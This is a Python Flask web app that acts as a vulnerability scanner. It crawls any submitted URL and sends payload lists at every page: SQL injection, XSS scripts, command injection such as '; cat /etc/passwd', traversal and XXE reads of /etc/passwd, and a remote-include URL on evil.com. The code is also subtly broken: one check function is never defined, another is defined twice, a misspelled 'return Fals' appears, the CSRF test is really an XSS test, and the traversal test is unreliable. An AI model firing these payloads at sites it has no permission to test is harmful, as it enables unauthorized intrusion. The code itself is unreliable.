from flask import Flask, render_template, request
import requests
from bs4 import BeautifulSoup
import urllib.parse
import re
import logging

app = Flask(__name__)

name = "XYNN ALMEYDA"
title = "Security Analyst | CE|H(Certified Ethical Hacking) | ComTIA+ | Manual Tester | Artificial Intelligence Developer | API maker"

@app.route("/")
def home():
    return render_template("index.html", name=name, title=title)

@app.route("/scan", methods=["POST"])
def scan_website():
    url = request.form["url"]
    discovered_urls = discover_urls(url)
    vulnerabilities = []

    for page_url in discovered_urls:
        page_vulnerabilities = scan_url(page_url)
        vulnerabilities.extend(page_vulnerabilities)

    return render_template("scan_results.html", vulnerabilities=vulnerabilities)

def discover_urls(url):
    discovered_urls = []
    try:
        response = requests.get(url)
        response.raise_for_status()  # Raises an HTTPError for bad responses
        soup = BeautifulSoup(response.text, "html.parser")
        for anchor_tag in soup.find_all("a"):
            href = anchor_tag.get("href")
            if href:
                absolute_url = urllib.parse.urljoin(url, href)
                if urllib.parse.urlparse(absolute_url).scheme in ["http", "https"]:
                    discovered_urls.append(absolute_url)
    except requests.RequestException as e:
        logging.error(f"Error fetching URL {url}: {e}")
    return discovered_urls

def scan_url(url):
    vulnerabilities = []
    if is_sql_injection_vulnerable(url):
        vulnerabilities.append("SQL injection vulnerability")

    if is_xss_vulnerable(url):
        vulnerabilities.append("Cross-site scripting (XSS) vulnerability")

    if has_insecure_configuration(url):
        vulnerabilities.append("Insecure server configuration")

    if is_command_injection_vulnerable(url):
        vulnerabilities.append("Command injection vulnerability")

    if is_path_traversal_vulnerable(url):
        vulnerabilities.append("Path traversal vulnerability")

    if is_csrf_vulnerable(url):
        vulnerabilities.append("Cross-site request forgery (CSRF) vulnerability")

    if is_idor_vulnerable(url):
        vulnerabilities.append("Insecure direct object reference (IDOR) vulnerability")

    if is_lfi_vulnerable(url):
        vulnerabilities.append("Local file inclusion (LFI) vulnerability")

    if is_rfi_vulnerable(url):
        vulnerabilities.append("Remote file inclusion (RFI) vulnerability")

    if is_ssrf_vulnerable(url):
        vulnerabilities.append("Server-side request forgery (SSRF) vulnerability")

    if is_xxe_vulnerable(url):
        vulnerabilities.append("XML external entity (XXE) vulnerability")

    return vulnerabilities

def is_sql_injection_vulnerable(url):
    payloads = [
        "' OR 1=1 --",
        "' OR '1'='1",
        "' OR 'x'='x",
        "' OR ''='",
        "' OR 1=1 LIMIT 1 --",
        "' OR 1=1 #",
        "' OR 1=1 /*",
        "' OR 1=1 -- -",
        "' OR 1=1 UNION ALL SELECT NULL,NULL,NULL,NULL --",
        "' OR 1=1 UNION ALL SELECT NULL,NULL,NULL,NULL #",
        "' OR 1=1 UNION ALL SELECT NULL,NULL,NULL,NULL /*"
    ]
    for payload in payloads:
        response = requests.get(url + "?id=" + payload)
        if re.search(r"error|warning", response.text, re.IGNORECASE):
            return True
    return False

def is_xss_vulnerable(url):
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<script>alert(/XSS/)</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>eval(alert(/XSS/))</script>",
        "<script>(alert)('XSS')</script>",
        "<script>setTimeout(alert, 1000, 'XSS')</script>",
        "<script>setInterval(alert, 1000, 'XSS')</script>"
    ]
    for payload in payloads:
        response = requests.get(url + "?input=" + payload)
        if payload in response.text:
            return True
    return False

def is_command_injection_vulnerable(url):
    payloads = [
        "; cat /etc/passwd",
        "; ls",
        "; pwd",
        "; env",
        "; uname -a",
        "; whoami",
        "; id",
        "; ifconfig",
        "; netstat -an",
        "; ps -ef",
        "; top"
    ]
    for payload in payloads:
        response = requests.get(url + "?cmd=" + payload)
        if re.search(r"root:x:", response.text):
            return True
    return False
def is_command_injection_vulnerable(url):
    payload = "; cat /etc/passwd"
    response = requests.get(url + "?cmd=" + payload)
    if re.search(r"root:x:", response.text):
        return True
    return False

def is_path_traversal_vulnerable(url):
    payload = "../../../../etc/passwd"
    response = requests.get(url + "/" + payload)
    if response.status_code == 200:
        return True
    return False

def is_csrf_vulnerable(url):
    payloads = [
        "<script>alert('CSRF')</script>",
        "<img src=x onerror=alert('CSRF')>",
        "<svg/onload=alert('CSRF')>",
        "javascript:alert('CSRF')"
    ]
    for payload in payloads:
        response = requests.post(url, data={"input": payload})
        if payload in response.text:
            return True
    return False

def is_idor_vulnerable(url):
    payloads = [
        "123",
        "456",
        "789",
        "012",
        "345"
    ]
    for payload in payloads:
        response = requests.get(url + "/user/" + payload)
        if "Secret data" in response.text:
            return True
    return False

def is_lfi_vulnerable(url):
    # Attempt to include a local file
    payload = "../../../../etc/passwd"
    response = requests.get(url + "?file=" + payload)

    # Check if the local file was included
    if "root:x:0:0:root" in response.text:
        return True
    return False

def is_rfi_vulnerable(url):
    # Attempt to include a remote file
    payload = "http://evil.com/malicious.php"
    response = requests.get(url + "?file=" + payload)

    # Check if the remote file was included
    if "Malicious content" in response.text:
        return True
    return False

def is_ssrf_vulnerable(url):
    # Attempt to make a request to an internal or external resource
    payload = "http://localhost/secret.txt"
    response = requests.get(url + "?url=" + payload)

    # Check if the response contains sensitive information
    if "Secret data" in response.text:
        return True
    return False

def is_xxe_vulnerable(url):
    # Attempt to parse an external XML entity
    payload = "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><!DOCTYPE lolz [<!ENTITY lolz SYSTEM 'file:///etc/passwd'>]><!DOCTYPE lolz [<!ENTITY lolz SYSTEM 'http://evil.com/malicious.php'>]><lolz>&xxe;</lolz>"
    response = requests.post(url, data={"xml": payload})

    # Check if the response contains sensitive information or allows unauthorized access
    if "root:x:0:0:root" in response.text or "Malicious content" in response.text:
        return True
    return Fals

if __name__ == "__main__":
    app.run(host="1.1.1.1", port=2710)
